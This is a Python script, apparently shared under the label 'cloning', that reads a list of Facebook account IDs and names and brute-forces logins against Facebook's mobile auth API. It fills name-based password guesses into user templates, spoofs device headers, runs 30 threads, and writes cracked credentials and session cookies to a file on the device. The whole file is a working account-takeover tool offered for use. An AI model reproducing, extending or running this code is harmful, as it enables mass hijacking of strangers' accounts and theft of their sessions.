#Simple Cloning Script
#Use New Ids File

import requests,re,random
import json
from concurrent.futures import ThreadPoolExecutor as e
import os,sys,uuid,time,string 

tids=[]

logo = """
Simple Script BY HaNNaN AnSari
"""

def menu():
	os.system('clear')
	print(logo)
	print()
	print('\033[1;96m-'*50)
	print()
	jj=input('\033[1;97m[?] File Name : ')
	try:open(jj)
	except:print("\033[1;97m[!] File Not Found ");time.sleep(0.5);menu()
	for i in open(jj).read().splitlines():
		tids.append(i)
	pwr()
	

pw= []
loop=0
ok=0

ua= """
Paste Your UserAgents Here
""".splitlines()

def start(id):
	try:
		global loop,ok
		loop+=1
		id,hhh=id.split('|')
		first=hhh.split(' ')[0]
		try:last=hhh.split(' ')[1]
		except:last=first
		sys.stdout.write(f'\r \033[1;97m {str(loop)} | \033[1;92m{str(ok)}\r ');sys.stdout.flush()
		for pwx in pw:
			pwx=pwx.replace('first',first.lower()).replace('last',last.lower()).replace('First',first).replace('Last',last)
			UserAgent = random.choice(ua)
			adid = str(''.join(random.Random().choices(string.hexdigits, k=16)))
			data = {"adid": adid,"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": id,"password": pwx,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","advertiser_id": "819f897c-11a5-4a40-afba-8b3a55debae4","currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
			headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": UserAgent,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
			url = 'https://b-graph.facebook.com/auth/login'
			res = requests.post(url,data=data,headers=headers)
			if 'session_key' in res.text:
				ok+=1
				Js = json.loads(res.text)
				Biscuits = ";".join(i["name"]+"="+i["value"] for i in Js["session_cookies"])       
				print("\r \033[1;92m[OK] "+id+" | "+pwx)
				#print(Biscuits) #For Cookie Print Remove (#)
				open("/sdcard/ok.txt","a").write(f"{id}|{pwx}|{Biscuits}")
			elif "www.facebook.com" in res.text:
				print("\r \033[1;91m[CP] "+id+" | "+pwx)
	except requests.exceptions.ConnectionError :time.sleep(3)
	except Exception as e:print(e)


def pwr():
	print()
	print('\033[1;96m-'*50)
	print()
	for i in range(int(input("\033[1;97m[+] Total Passwords: "))):
		pw.append(input(f"\033[1;97m[{str(i+1)}] Password : "))
	print()
	print('\033[1;96m-'*50)
	print()
	for id in tids:
		e(max_workers=30).submit(start,id)
		


menu()
